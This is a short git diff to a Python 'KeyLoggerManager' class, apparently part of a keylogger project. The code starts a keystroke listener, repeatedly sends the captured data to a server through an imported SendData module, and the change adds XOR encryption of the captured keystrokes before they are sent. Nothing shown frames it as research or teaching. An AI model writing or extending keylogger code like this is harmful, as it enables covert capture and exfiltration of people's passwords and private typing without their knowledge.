@@ -2,6 +2,8 @@ import time
 from send_ping import SendPing
 from send_data import SendData
 from key_logger_service import KeyLoggerService
+from encrypt import Encryption
+from file_writer import FileWriter
 
 
 class KeyLoggerManager:
@@ -14,8 +16,10 @@ class KeyLoggerManager:
         self.service.start_listener()
         while True:
             generator = self.service.send_every_minute()
+
             for data in generator:
-                server_commend = SendData(data).send()
+                encrypted_data = Encryption(data).xor_encryption()
+                server_commend = SendData(encrypted_data).send()
                 if not server_commend:
                     self.service.stop_listener()
                     return False
